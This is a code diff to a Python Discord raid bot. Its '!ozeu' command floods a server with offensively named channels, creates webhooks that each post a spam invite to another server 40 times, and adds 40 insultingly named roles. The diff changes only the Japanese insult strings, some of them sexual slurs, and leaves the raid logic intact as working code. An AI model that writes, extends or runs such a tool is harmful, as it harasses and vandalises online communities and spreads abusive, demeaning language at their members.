@@ -15,7 +15,7 @@ OWNER_ID = 1386539010381451356  # あなたのDiscord ID
 
 SPAM_MESSAGE = (
     "# バカどもがw とっととOzeu鯖入っとけw\n"
-    "# join Ozeu NOW\n"
+    "# join Ozeu NOW!!\n"
     "discord.gg/ozetudo\n"
     "https://i.imgur.com/NbBGFcf.mp4\n"
     "https://media.discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&\n"
@@ -127,7 +127,7 @@ async def ozeu(ctx, guild_id: int = None):
             return
     else:
         if ctx.guild.id in safe_servers:
-            await ctx.send("❌ このサーバーは安全リストに登録されているため、!kuritorisuは実行できません。")
+            await ctx.send("❌ このサーバーは安全リストに登録されているため、!ozeuは実行できません。")
             return
         guild = ctx.guild
 
@@ -162,7 +162,7 @@ async def ozeu(ctx, guild_id: int = None):
     # --- チャンネル作成関数 ---
     async def create_channel(i):
         try:
-            return await guild.create_text_channel(name="雑魚まんこに荒らされてやんのｗｗｗ")
+            return await guild.create_text_channel(name="馬鹿がｗ荒らされてやんのｗｗｗ")
         except Exception as e:
             print(f"[ozeu] {i+1}個目のチャンネル作成失敗: {e}")
             return None
@@ -175,7 +175,7 @@ async def ozeu(ctx, guild_id: int = None):
         try:
             webhook = await channel.create_webhook(name="ZPlusWebhook")
             for _ in range(40):
-                await webhook.send(SPAM_MESSAGE, username="ガバまんこ")
+                await webhook.send(SPAM_MESSAGE, username="無知どもがｗ")
         except Exception as e:
             print(f"[ozeu] {channel.name} のWebhook送信でエラー: {e}")
 
@@ -184,7 +184,7 @@ async def ozeu(ctx, guild_id: int = None):
     # ロール作成
     try:
         for i in range(40):
-            await guild.create_role(name=f"bot用権限{i+1}")
+            await guild.create_role(name=f"バカどもにはちょうどいいｗ{i+1}")
     except Exception as e:
         print(f"[ozeu] ロール作成でエラー: {e}")
 
